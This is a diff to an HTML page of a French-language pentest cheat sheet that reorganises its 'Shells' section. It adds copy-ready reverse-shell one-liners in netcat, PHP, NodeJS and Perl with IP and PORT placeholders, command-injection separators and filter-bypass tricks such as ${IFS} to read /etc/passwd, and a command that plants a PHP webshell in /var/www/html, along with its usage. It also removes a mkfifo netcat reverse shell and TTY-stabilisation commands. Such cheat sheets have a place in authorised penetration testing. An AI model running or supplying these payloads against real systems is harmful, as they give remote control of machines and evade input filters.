@@ -1,8 +1,80 @@
-<h1>Shells & Exécution</h1>
+<h2 style="margin: 30px 0 30px 0;">Shells</h2>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Reverse Shells - Bash</h2>
+        <h3>Reverse Shell Generator</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content" style="padding: 0;">
+        <iframe src="https://www.revshells.com/" style="width: 100%; height: 600px; border: none;"
+            title="Reverse Shell Generator">
+        </iframe>
+    </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>Bypasses</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content">
+        <div class="cmd-item">
+            <p class="cmd-description"><strong>1. Séparateurs de commandes (Linux/Windows)</strong></p>
+            <div class="code-block">
+                <code>;</code> <code>&amp;</code> <code>|</code> <code>&amp;&amp;</code> <code>||</code>
+                <code>%0a</code> (Saut de ligne)
+            </div>
+            <p class="cmd-description">Test : <code>; id</code> | <code>&amp; whoami</code> | <code>%0a id</code></p>
+        </div>
+
+        <div class="cmd-item">
+            <p class="cmd-description"><strong>2. Bypasses de filtres (Espaces / Mots bloqués)</strong></p>
+            <div class="code-block">
+                <code>${IFS}</code> (Remplace l'espace : <code>cat${IFS}/etc/passwd</code>) <br>
+                <code>$()</code> ou <code>""</code> (Coupe les mots : <code>wh$()oami</code> ou <code>w"h"oami</code>)
+            </div>
+            <p class="cmd-description">Encapsulation (Linux) : <code>echo "User: $(whoami)"</code> ou <code>`id`</code>
+            </p>
+        </div>
+    </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>Netcat</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content">
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>nc -lvnp <span class="variable" data-var="port">PORT</span></code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Écoute sur un port spécifique</p>
+        </div>
+
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>/bin/nc -nv <span class="variable" data-var="ip">IP</span> <span class="variable" data-var="port">PORT</span> -e /bin/bash  </code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+            <p class="cmd-description">Shell de connexion à un serveur netcat</p>
+        </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>Bash</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -35,7 +107,7 @@
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Reverse Shells - Python</h2>
+        <h3>Python</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -49,20 +121,19 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Reverse shell Python</p>
         </div>
     </div>
 </div>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Reverse Shells - Netcat</h2>
+        <h3>PHP</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
         <div class="cmd-item">
             <div class="code-block">
-                <code>nc -e /bin/bash <span class="variable" data-var="ip">IP</span> <span class="variable" data-var="port">PORT</span></code>
+                <code>php -r '$sock=fsockopen("<span class="variable" data-var="ip">IP</span>",<span class="variable" data-var="port">PORT</span>);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -70,26 +141,53 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Reverse shell netcat avec -e</p>
-        </div>
-        <div class="cmd-item">
-            <div class="code-block">
-                <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc <span class="variable" data-var="ip">IP</span> <span class="variable" data-var="port">PORT</span> &gt;/tmp/f</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Reverse shell netcat sans -e</p>
         </div>
     </div>
 </div>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Reverse Shells - PowerShell</h2>
+        <h3>NodeJS</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content">
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>node -e "const net = require('net'); const child_process = require('child_process'); const client = new net.Socket(); client.connect(<span class="variable" data-var="port">PORT</span>, '<span class="variable" data-var="ip">IP</span>', () => { client.pipe(child_process.spawn('/bin/sh', ['-i']).stdin); child_process.spawn('/bin/sh', ['-i']).stdout.pipe(client); });"</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>Perl</h3>
+        <span class="collapse-icon">▼</span>
+    </div>
+    <div class="card-content">
+        <div class="cmd-item">
+            <div class="code-block">
+                <code>perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in(<span class="variable" data-var="port">PORT</span>,inet_aton("<span class="variable" data-var="ip">IP</span>"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'</code>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="card collapsible">
+    <div class="card-header">
+        <h3>PowerShell</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
@@ -103,20 +201,19 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Reverse shell PowerShell</p>
         </div>
     </div>
 </div>
 
 <div class="card collapsible">
     <div class="card-header">
-        <h2>Listeners</h2>
+        <h3>Créer un Webshell</h3>
         <span class="collapse-icon">▼</span>
     </div>
     <div class="card-content">
         <div class="cmd-item">
             <div class="code-block">
-                <code>nc -lvnp <span class="variable" data-var="port">PORT</span></code>
+                <code>echo "&lt;?php system(\$_GET['cmd']); ?&gt;" > /var/www/html/shell.php</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -124,52 +221,7 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Listener netcat simple</p>
-        </div>
-        <div class="cmd-item">
-            <div class="code-block">
-                <code>rlwrap nc -lvnp <span class="variable" data-var="port">PORT</span></code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Listener avec historique (rlwrap)</p>
-        </div>
-    </div>
-</div>
-
-<div class="card collapsible">
-    <div class="card-header">
-        <h2>Stabilisation de shell</h2>
-        <span class="collapse-icon">▼</span>
-    </div>
-    <div class="card-content">
-        <div class="cmd-item">
-            <div class="code-block">
-                <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Spawn un TTY avec Python</p>
-        </div>
-        <div class="cmd-item">
-            <div class="code-block">
-                <code>export TERM=xterm</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Définir le type de terminal</p>
+            <p class="cmd-description">Accès : <code>URL/shell.php?cmd=id</code> (Note: <code>+</code> remplace l'espace en URL)</p>
         </div>
     </div>
 </div>
